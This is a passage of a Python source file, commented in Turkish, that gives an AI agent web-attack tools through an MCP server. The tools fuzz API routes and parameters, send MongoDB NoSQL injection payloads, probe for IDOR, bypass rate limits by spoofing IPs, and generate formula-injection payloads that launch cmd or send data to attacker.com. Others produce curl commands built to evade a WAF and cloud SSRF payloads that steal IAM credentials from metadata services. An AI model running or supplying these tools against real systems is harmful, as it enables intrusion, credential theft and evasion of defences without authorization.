    except Exception as e:
        return f"HATA: bağlantı: {e}"

    resp = data.decode(errors="replace")
    first_line = resp.split("\r\n", 1)[0]
    if "101" in first_line:
        return (
            f"🚨 CROSS-ORIGIN WS KABUL EDİLDİ (Origin: {origin})\n"
            f"  {first_line}\n\n"
            f"→ Cross-site WebSocket hijack (CSWSH) mümkün — oturum hırsızlığı testi yap\n"
            f"→ JS PoC: new WebSocket('{ws_url}') + onmessage → attacker server"
        )
    return (
        f"✓ Cross-origin WS reddedildi (Origin kontrolü var)\n"
        f"  {first_line}\n"
        f"  Response header: {_shorten(resp, 400)}"
    )


# ============================================================
# OPENAPI / POSTMAN / SWAGGER INGEST (Paket 2)
# ============================================================

@mcp.tool()
def openapi_ingest(source: str, proxy: str = "") -> str:
    """OpenAPI/Swagger spec'i ingest et → endpoint + parametre listesi çıkar.

    Args:
        source: URL veya lokal dosya path (YAML/JSON)
        proxy: opsiyonel HTTP proxy
    """
    content: str
    if source.startswith(("http://", "https://")):
        try:
            r = _session(proxy=proxy).get(source, timeout=DEFAULT_TIMEOUT)
            r.raise_for_status()
            content = r.text
        except Exception as e:
            return f"HATA: URL fetch: {e}"
    else:
        if not os.path.isfile(source):
            return f"HATA: dosya yok: {source}"
        content = open(source, encoding="utf-8", errors="replace").read()

    # JSON veya YAML
    spec: dict
    try:
        spec = json.loads(content)
    except json.JSONDecodeError:
        try:
            import yaml  # type: ignore
            spec = yaml.safe_load(content)
        except Exception as e:
            return f"HATA: JSON/YAML parse: {e}"

    if not isinstance(spec, dict) or "paths" not in spec:
        return "HATA: geçersiz OpenAPI spec (paths yok)"

    info = spec.get("info") or {}
    servers = spec.get("servers") or [{"url": spec.get("host", "")}]
    base_url = (servers[0] or {}).get("url", "") if servers else ""

    lines = [
        f"📘 OpenAPI: {info.get('title', '?')} v{info.get('version', '?')}",
        f"   Base:   {base_url}",
        f"   Paths:  {len(spec['paths'])}",
        "",
    ]
    dangerous_re = re.compile(r"(admin|delete|upload|exec|password|token|secret|internal)", re.IGNORECASE)
    endpoints = []
    for path, methods in spec["paths"].items():
        if not isinstance(methods, dict):
            continue
        for method, meta in methods.items():
            if method.startswith("x-") or method not in ("get", "post", "put", "patch", "delete", "head", "options"):
                continue
            params = meta.get("parameters") or []
            param_names = [p.get("name", "?") for p in params]
            sec = meta.get("security") or []
            sec_label = "auth" if sec else "PUBLIC"
            marker = " ⚠" if dangerous_re.search(path + " " + (meta.get("summary") or "")) else ""
            endpoints.append(f"  [{method.upper():6s}] {path:50s} [{sec_label}] params={param_names}{marker}")

    lines.extend(endpoints[:60])
    if len(endpoints) > 60:
        lines.append(f"  ... ({len(endpoints) - 60} daha)")

    # Kaydet
    out = os.path.join(LOG_DIR, f"openapi_endpoints_{int(time.time())}.json")
    with open(out, "w") as f:
        json.dump({"base_url": base_url, "endpoints": endpoints}, f, indent=2)
    lines.append(f"\n📁 Çıktı: {out}")
    lines.append("→ Her endpoint için `api_route_fuzz` + `api_idor_matrix` denenmeli")
    return "\n".join(lines)


@mcp.tool()
def postman_ingest(collection_path: str) -> str:
    """Postman collection v2.x JSON ingest → endpoint extraction."""
    if not os.path.isfile(collection_path):
        return f"HATA: dosya yok: {collection_path}"
    try:
        coll = json.load(open(collection_path, encoding="utf-8"))
    except Exception as e:
        return f"HATA: JSON parse: {e}"

    endpoints = []

    def _walk(item):
        if isinstance(item, list):
            for i in item:
                _walk(i)
            return
        if not isinstance(item, dict):
            return
        if "item" in item:
            _walk(item["item"])
        if "request" in item:
            req = item["request"]
            method = (req.get("method") or "GET").upper()
            url = req.get("url")
            if isinstance(url, dict):
                url = url.get("raw") or ""
            headers = [h.get("key", "") for h in (req.get("header") or [])]
            body = ""
            if isinstance(req.get("body"), dict):
                body = req["body"].get("raw", "")[:100]
            endpoints.append({
                "method": method, "url": url, "headers": headers,
                "body_sample": body, "name": item.get("name", "")
            })

    _walk(coll.get("item", []))

    out = os.path.join(LOG_DIR, f"postman_endpoints_{int(time.time())}.json")
    json.dump(endpoints, open(out, "w"), indent=2)

    lines = [
        f"📗 Postman Collection: {coll.get('info', {}).get('name', '?')}",
        f"   Endpoint sayısı: {len(endpoints)}",
        "",
    ]
    for e in endpoints[:30]:
        lines.append(f"  [{e['method']:6s}] {e['name'][:30]:30s} {e['url'][:80]}")
    if len(endpoints) > 30:
        lines.append(f"  ... ({len(endpoints) - 30} daha)")
    lines.append(f"\n📁 Çıktı: {out}")
    return "\n".join(lines)


# ============================================================
# API ROUTE FUZZ + ARJUN-like PARAM DISCOVERY (Paket 2)
# ============================================================

_API_ROUTES_DEFAULT = [
    "api", "api/v1", "api/v2", "api/v3", "v1", "v2", "rest", "graphql",
    "admin", "admin/api", "internal", "internal/api", "debug", "actuator",
    "swagger", "swagger.json", "openapi.json", "openapi.yaml", "api-docs",
    "health", "metrics", "status", ".env", ".git/config", "backup",
    "users", "user", "accounts", "account", "auth", "login", "oauth",
    "token", "refresh", "logout", "register", "signup", "password/reset",
    "admin/users", "admin/login", "admin/panel", "admin/dashboard",
    "phpinfo.php", "info.php", "server-status", "server-info",
    "console", "console/login", "jolokia", "hawtio",
    "files", "upload", "download", "export", "import",
    "api/users", "api/products", "api/orders", "api/config",
    "api/admin", "api/internal", "api/debug", "api/health",
]


@mcp.tool()
def api_route_fuzz(base_url: str, wordlist: str = "", threads: int = 20,
                   extensions: str = "", proxy: str = "") -> str:
    """API route bruteforce — kiterunner benzeri built-in wordlist'li.

    Args:
        base_url: hedef base URL
        wordlist: opsiyonel wordlist dosyası (boşsa built-in ~65 route)
        threads: paralel thread sayısı
        extensions: virgülle ayrılmış uzantılar ('', '.json', '.php')
        proxy: opsiyonel proxy
    """
    routes = []
    if wordlist and os.path.isfile(wordlist):
        try:
            with open(wordlist, errors="replace") as f:
                routes = [ln.strip() for ln in f if ln.strip() and not ln.strip().startswith("#")]
        except Exception as e:
            return f"HATA: wordlist: {e}"
    else:
        routes = list(_API_ROUTES_DEFAULT)

    exts = [e.strip() for e in extensions.split(",") if e.strip()] or [""]
    base = base_url.rstrip("/")

    tested: list[tuple[str, int, int]] = []

    def _probe(path: str):
        url = f"{base}/{path}"
        try:
            s = _session(proxy=proxy)
            r = s.get(url, timeout=DEFAULT_TIMEOUT, allow_redirects=False)
            return (url, r.status_code, len(r.content))
        except Exception:
            return (url, -1, 0)

    all_paths = [r + e for r in routes for e in exts]
    with ThreadPoolExecutor(max_workers=threads) as ex:
        for res in as_completed([ex.submit(_probe, p) for p in all_paths]):
            tested.append(res.result())

    # Filtre: 200/201/301/302/401/403 ilginç; 404 atılır
    interesting = [t for t in tested if t[1] in (200, 201, 204, 301, 302, 307, 308, 401, 403, 405, 500)]
    interesting.sort(key=lambda x: x[1])

    lines = [f"🎯 API Route Fuzz — {len(all_paths)} deneme, {len(interesting)} bulgu"]
    for url, sc, sz in interesting[:80]:
        lines.append(f"  [{sc}] {sz:7d}B  {url}")
    if not interesting:
        lines.append("  (hiçbir ilginç yanıt yok)")
    return "\n".join(lines)


_ARJUN_DEFAULT_PARAMS = [
    "id", "user", "username", "email", "name", "debug", "admin", "role",
    "page", "limit", "offset", "sort", "order", "filter", "search", "q",
    "redirect", "url", "return", "next", "callback", "jsonp", "cb",
    "token", "key", "api_key", "apikey", "access_token", "auth",
    "file", "path", "dir", "include", "template", "module",
    "action", "cmd", "exec", "command", "data", "input", "body",
    "price", "amount", "quantity", "qty", "product_id", "user_id",
    "ref", "referer", "origin", "host", "ip", "lang", "locale",
    "format", "type", "mode", "view", "style", "color", "theme",
]


@mcp.tool()
def api_param_discover(url: str, method: str = "GET", threads: int = 20,
                       wordlist: str = "", proxy: str = "") -> str:
    """Arjun-style parameter discovery — yanıt size/status diff'iyle gizli param bul.

    Her param tek tek eklenir, baseline'a göre response length/status farklı
    mı kontrol edilir.
    """
    params = []
    if wordlist and os.path.isfile(wordlist):
        with open(wordlist, errors="replace") as f:
            params = [ln.strip() for ln in f if ln.strip()]
    else:
        params = list(_ARJUN_DEFAULT_PARAMS)

    s = _session(proxy=proxy)
    # Baseline
    baseline = s.request(method, url, timeout=DEFAULT_TIMEOUT)
    base_len = len(baseline.content)
    base_sc = baseline.status_code

    found = []

    def _probe(p: str):
        canary = f"cco{int(time.time() * 1000) % 100000}"
        try:
            if method == "GET":
                sep = "&" if "?" in url else "?"
                r = s.get(f"{url}{sep}{p}={canary}", timeout=DEFAULT_TIMEOUT)
            else:
                r = s.request(method, url, data={p: canary}, timeout=DEFAULT_TIMEOUT)
            return (p, r.status_code, len(r.content), canary in r.text)
        except Exception:
            return (p, -1, 0, False)

    with ThreadPoolExecutor(max_workers=threads) as ex:
        results = [ex.submit(_probe, p) for p in params]
        for fut in as_completed(results):
            p, sc, sz, reflected = fut.result()
            size_diff = abs(sz - base_len)
            if reflected:
                found.append(f"  🎯 {p} REFLECTED (sc={sc}, size_diff={size_diff})")
            elif sc != base_sc or size_diff > 50:
                found.append(f"  ⚠ {p} status_diff={sc}≠{base_sc} size_diff={size_diff}")

    if not found:
        return f"✗ Gizli parametre bulunamadı ({len(params)} test edildi)"
    return f"🎯 API Param Discovery — {len(found)} aday:\n" + "\n".join(found)


# ============================================================
# NOSQL INJECTION (Paket 2)
# ============================================================

_NOSQLI_MONGO = [
    {"$ne": None},
    {"$gt": ""},
    {"$regex": ".*"},
    {"$exists": True},
    {"$in": ["admin", "root", "administrator"]},
    {"$where": "1==1"},
    {"$where": "sleep(2000)"},  # blind time-based
]


@mcp.tool()
def nosqli_mongo_test(url: str, param: str = "username", method: str = "POST",
                     body_template: str = "", proxy: str = "") -> str:
    """MongoDB NoSQLi test — operator injection variants.

    Args:
        url: hedef (login endpoint önerilir)
        param: injekte edilecek param adı
        method: HTTP metodu
        body_template: JSON body template (empty → `{"username":"a","password":"b"}`)
        proxy: opsiyonel proxy
    """
    template = body_template or '{"username":"a","password":"b"}'
    try:
        template_d = json.loads(template)
    except json.JSONDecodeError:
        return "HATA: body_template JSON olmalı"

    s = _session(proxy=proxy)
    # Baseline (normal req)
    try:
        baseline = s.request(method, url, json=template_d, timeout=DEFAULT_TIMEOUT)
    except Exception as e:
        return f"HATA: baseline: {e}"
    base_len = len(baseline.content)
    base_sc = baseline.status_code

    findings = []
    for payload in _NOSQLI_MONGO:
        test_body = dict(template_d)
        test_body[param] = payload
        t0 = time.time()
        try:
            r = s.request(method, url, json=test_body, timeout=DEFAULT_TIMEOUT + 5)
        except Exception as e:
            findings.append(f"  [{json.dumps(payload)}] HATA: {e}")
            continue
        dt = time.time() - t0
        diff = abs(len(r.content) - base_len)
        time_flag = " ⏱ TIME-BASED" if dt > 2 else ""
        marker = ""
        if r.status_code != base_sc or diff > 50:
            marker = " ⚠"
        if "token" in r.text.lower() or "success" in r.text.lower():
            marker = " 🚨 AUTH BYPASS ŞÜPHESİ"
        findings.append(
            f"  [{json.dumps(payload):40s}] sc={r.status_code} Δsize={diff}{time_flag}{marker}"
        )

    return f"🎯 MongoDB NoSQLi Test — {param} üzerinde:\n" + "\n".join(findings)


# ============================================================
# API IDOR MATRIX (Paket 2)
# ============================================================

@mcp.tool()
def api_idor_matrix(url_template: str, ids: str, tokens: str = "", proxy: str = "") -> str:
    """IDOR multi-tenant matrix scanner.

    url_template içinde `{ID}` placeholder'ı olmalı (örn: `/api/users/{ID}/profile`).
    Her token ile her ID denenir, status+size matrisi çıkarılır.

    Args:
        url_template: `{ID}` placeholder'lı URL
        ids: virgülle ayrılmış ID'ler (kendi ID + başka kullanıcılar)
        tokens: virgülle ayrılmış Bearer token'lar (boşsa auth olmadan)
        proxy: opsiyonel proxy
    """
    if "{ID}" not in url_template:
        return "HATA: url_template '{ID}' placeholder içermeli"
    id_list = [i.strip() for i in ids.split(",") if i.strip()]
    token_list = [t.strip() for t in tokens.split(",") if t.strip()] or [""]
    if len(id_list) < 2:
        return "HATA: en az 2 ID girin (kendi + başka)"

    s = _session(proxy=proxy)
    matrix = []  # [(token_idx, id, status, size)]

    for ti, token in enumerate(token_list):
        headers = {"Authorization": f"Bearer {token}"} if token else {}
        for target_id in id_list:
            u = url_template.replace("{ID}", target_id)
            try:
                r = s.get(u, headers=headers, timeout=DEFAULT_TIMEOUT)
                matrix.append((ti, target_id, r.status_code, len(r.content)))
            except Exception:
                matrix.append((ti, target_id, -1, 0))

    # Render
    header = "Token\\ID     " + "  ".join(f"{i:>10s}" for i in id_list)
    lines = ["🎯 IDOR Matrix", header]
    for ti in range(len(token_list)):
        row = [f"token_{ti:2d}     "]
        for tid in id_list:
            sc_sz = next(((sc, sz) for t, i, sc, sz in matrix if t == ti and i == tid), (None, None))
            row.append(f"  {sc_sz[0]}/{sc_sz[1]}B".rjust(12))
        lines.append("".join(row))
    # Analiz: farklı token'la aynı ID'ye 200 geldiyse şüphe
    lines.append("")
    for tid in id_list:
        codes = [sc for (ti, i, sc, sz) in matrix if i == tid]
        if 200 in codes and len(set(codes)) == 1 and len(codes) > 1:
            lines.append(f"  🚨 {tid}: TÜM token'larla 200 → IDOR (authorization yok)")
        elif 200 in codes and 401 in codes:
            lines.append(f"  ✓ {tid}: bazı token'larla 401, bazılarıyla 200 → doğru erişim kontrolü")
    return "\n".join(lines)


# ============================================================
# API RATE LIMIT BYPASS (Paket 2)
# ============================================================

@mcp.tool()
def api_rate_bypass_probe(url: str, count: int = 20, proxy: str = "") -> str:
    """Rate limit bypass probe — IP spoofing / case / path variants.

    Aynı endpoint'e `count` kez farklı header/path varyantıyla istek atar,
    hangi yöntem 429'u tetiklemiyor tespit eder.
    """
    s = _session(proxy=proxy)

    variants = [
        ("plain", {}, url),
        ("X-Forwarded-For random IP", {"X-Forwarded-For": "1.2.3.4"}, url),
        ("X-Real-IP random", {"X-Real-IP": "1.2.3.4"}, url),
        ("X-Originating-IP", {"X-Originating-IP": "1.2.3.4"}, url),
        ("X-Client-IP", {"X-Client-IP": "1.2.3.4"}, url),
        ("Cluster-Client-IP", {"X-Cluster-Client-IP": "1.2.3.4"}, url),
        ("path case", {}, url + ("/." if "?" not in url else "")),
        ("trailing %00", {}, url + "%00"),
        ("trailing space", {}, url + "%20"),
    ]

    results = []
    for label, headers, u in variants:
        blocked = 0
        success = 0
        for i in range(count):
            # Her istekte IP'yi randomize et (spoof senaryoları için)
            h2 = dict(headers)
            for ip_hdr in ("X-Forwarded-For", "X-Real-IP", "X-Originating-IP", "X-Client-IP", "X-Cluster-Client-IP"):
                if ip_hdr in h2:
                    h2[ip_hdr] = f"{i % 255}.{(i * 7) % 255}.{(i * 13) % 255}.{i % 255}"
            try:
                r = s.get(u, headers=h2, timeout=DEFAULT_TIMEOUT)
                if r.status_code == 429:
                    blocked += 1
                elif r.status_code < 500:
                    success += 1
            except Exception:
                pass
        bypass_icon = "🚨 BYPASS" if blocked == 0 and success > count * 0.5 else ""
        results.append(f"  [{label:35s}] 200≈{success}/{count}  429={blocked}  {bypass_icon}")

    return f"🎯 Rate Limit Bypass Probe — {count} istek/varyant:\n" + "\n".join(results)


# ============================================================
# FORMULA / CSV INJECTION (Paket 2)
# ============================================================

_FORMULA_PAYLOADS = [
    '=cmd|" /C calc"!A1',
    '@SUM(1+9)*cmd|" /C calc"!A0',
    '=HYPERLINK("https://attacker.com/exfil","click")',
    '=IMPORTXML("https://attacker.com/x","/a")',
    '=WEBSERVICE("https://attacker.com/x")',
    "+1+2",
    '=1+1',
    '-1+1',
]


@mcp.tool()
def formula_injection_payloads(scenario: str = "all") -> str:
    """Excel/CSV formula injection payload generator.

    Args:
        scenario: 'all' | 'rce' | 'exfil' | 'basic'
    """
    subset = _FORMULA_PAYLOADS
    if scenario == "rce":
        subset = [p for p in _FORMULA_PAYLOADS if "cmd" in p.lower()]
    elif scenario == "exfil":
        subset = [p for p in _FORMULA_PAYLOADS if "HYPERLINK" in p.upper() or "IMPORTXML" in p.upper() or "WEBSERVICE" in p.upper()]
    elif scenario == "basic":
        subset = ["=1+1", "+1+2", "-1+1"]

    return (
        f"🎯 CSV/Excel Formula Injection Payloads ({scenario}):\n"
        + "\n".join(f"  {p}" for p in subset)
        + "\n\n→ Hedef: CSV export'u olan form alanlarına gömülür, "
        "admin Excel'de açtığında komut tetiklenir\n"
        "→ Mitigation: değerleri ' ile prefix'le veya rakam/formula başlıyorsa quote'la"
    )


# ============================================================
# SAML XSW (Paket 1)
# ============================================================

@mcp.tool()
def saml_xsw_variants(saml_b64: str) -> str:
    """SAML XSW (XML Signature Wrapping) saldırı varyantları üret.

    Args:
        saml_b64: base64-encoded SAML response
    """
    try:
        raw = base64.b64decode(saml_b64)
        xml = raw.decode(errors="replace")
    except Exception as e:
        return f"HATA: base64 decode: {e}"

    # Basit XSW manipülasyonu — Assertion'ı duplicate et
    try:
        import xml.etree.ElementTree as ET
        root = ET.fromstring(xml)
    except Exception as e:
        return f"HATA: XML parse: {e}"

    assertions = [el for el in root.iter() if el.tag.endswith("}Assertion") or el.tag == "Assertion"]
    if not assertions:
        return "HATA: SAML Assertion bulunamadı"

    lines = ["🎯 SAML XSW Saldırı Rehberi:", ""]
    lines.append(f"Mevcut Assertion sayısı: {len(assertions)}")
    lines.append("\nKritik XSW varyantları (manuel oluşturulmalı):")
    lines.extend([
        "  XSW1: Root'a imza + Assertion'ı duplicate et (imzasız)",
        "  XSW2: Assertion imzası var, yeni Assertion'ı Extensions altına koy",
        "  XSW3: Imzalı Assertion'ı yeni Response'un child'ı yap",
        "  XSW4: Original Assertion'ı attacker'ın içine yerleştir",
        "  XSW5: SignedInfo URI mismatch (farklı ID)",
        "  XSW6: Evil Assertion'ı SignedInfo'nun dışında bırak, imzalı olanı child yap",
        "  XSW7: Evil Assertion'ı Extensions içinde gizle",
        "  XSW8: Signature'ı attacker Assertion'ının child'ı yap",
    ])
    lines.append("\n→ Otomatik üretim: SAMLRaider Burp plugin veya python-saml_xsw")
    lines.append("→ Test sırası: XSW8 → XSW7 → XSW3 → XSW1 (en yaygın kabul edilenler)")
    return "\n".join(lines)


# ============================================================
# STEALTH REQUEST GENERATOR (Phase 3)
# ============================================================

@mcp.tool()
def generate_stealth_curl(url: str, method: str = "GET", data: str = "") -> str:
    """WAF'tan (Cloudflare/Akamai vb.) kaçmak için stealth curl komutları üretir.
    Rastgele gecikme, sahte User-Agent rotasyonu, HTTP header manipülasyonu (X-Forwarded-For) içerir.

    Args:
        url: Hedef URL
        method: HTTP metodu (GET, POST vb.)
        data: POST edilecek veri (isteğe bağlı)
    """
    import random
    import shlex
    
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/115.0.5790.130 Mobile/15E148 Safari/604.1"
    ]
    ua = random.choice(user_agents)
    
    # Sahte IP üretimi
    fake_ip = f"{random.randint(1,254)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
    
    headers = [
        f"-H 'User-Agent: {ua}'",
        f"-H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8'",
        f"-H 'Accept-Language: en-US,en;q=0.9'",
        f"-H 'Accept-Encoding: gzip, deflate, br'",
        f"-H 'Connection: keep-alive'",
        f"-H 'Cache-Control: max-age=0'",
        f"-H 'X-Forwarded-For: {fake_ip}'",
        f"-H 'X-Real-IP: {fake_ip}'"
    ]
    
    cmd_parts = ["curl", "-s", "-i", "-L", "--path-as-is"]
    if method.upper() != "GET":
        cmd_parts.append(f"-X {method}")
    cmd_parts.extend(headers)
    
    if data:
        cmd_parts.append(f"-d {shlex.quote(data)}")
        
    cmd_parts.append(shlex.quote(url))
    
    stealth_cmd = " ".join(cmd_parts)
    
    lines = [
        f"🎯 Stealth Curl Komutu (WAF Atlatma Teknikli):",
        "-" * 50,
        stealth_cmd,
        "-" * 50,
        "🛠 Teknikler:",
        "- Gerçekçi User-Agent (Rotasyonlu)",
        "- X-Forwarded-For ve X-Real-IP Spoofing",
        "- --path-as-is (Path normalizasyonunu engeller, LFI için faydalı)",
        "- Tam tarayıcı benzeri HTTP Accept başlıkları",
        "",
        "💡 Not: Otomatik taramalarda bu komutu bir bash loop'u içine alıp `sleep $(shuf -i 1-5 -n 1)` ile jitter ekleyebilirsiniz."
    ]
    return "\n".join(lines)


# ============================================================
# CLOUD EXPLOITATION (Phase 4)
# ============================================================

@mcp.tool()
def generate_cloud_ssrf_payloads(provider: str = "aws") -> str:
    """AWS, GCP ve Azure metadata (IMDS) servisleri için SSRF payload'ları ve WAF atlatma varyantları üretir.
    
    Args:
        provider: 'aws', 'gcp', 'azure' veya 'all'
    """
    provider = provider.lower()
    lines = [f"🎯 Cloud SSRF Payloads ({provider.upper()})"]
    lines.append("-" * 50)
    
    if provider in ["aws", "all"]:
        lines.extend([
            "☁️ AWS (169.254.169.254):",
            "  Standart IMDSv1:",
            "    http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "  IMDSv2 Bypass (Özel Header Gerektirir):",
            "    X-aws-ec2-metadata-token-ttl-seconds: 21600",
            "    PUT http://169.254.169.254/latest/api/token",
            "  WAF Bypass / Normalizasyon Varyantları (169.254.169.254 için):",
            "    http://169.254.169.254.xip.io/latest/meta-data/",
            "    http://2852039166/latest/meta-data/  (Decimal IP)",
            "    http://0xA9FEA9FE/latest/meta-data/  (Hex IP)",
            "    http://0251.0376.0251.0376/latest/meta-data/  (Octal IP)",
            "    http://[::ffff:169.254.169.254]/latest/meta-data/  (IPv6 Mapped)",
        ])
        
    if provider in ["gcp", "all"]:
        lines.extend([
            "",
            "☁️ GCP (Google Cloud):",
            "  Gereken Header: Metadata-Flavor: Google",
            "  Endpoint:",
            "    http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
            "    http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token",
        ])
        
    if provider in ["azure", "all"]:
        lines.extend([
            "",
            "☁️ Azure:",
            "  Gereken Header: Metadata: true",
            "  Endpoint:",
            "    http://169.254.169.254/metadata/instance?api-version=2021-02-01",
            "    http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
        ])

    lines.extend([
        "-" * 50,
        "💡 İpucu: Çalınan IAM Key'leri `export AWS_ACCESS_KEY_ID=...` ile ortama yükleyin.",
        "Ardından `aws sts get-caller-identity` komutu ile doğrulayın."
    ])
    
    return "\n".join(lines)


# ============================================================
# TOOL LISTING
# ============================================================

if __name__ == "__main__":
    mcp.run()
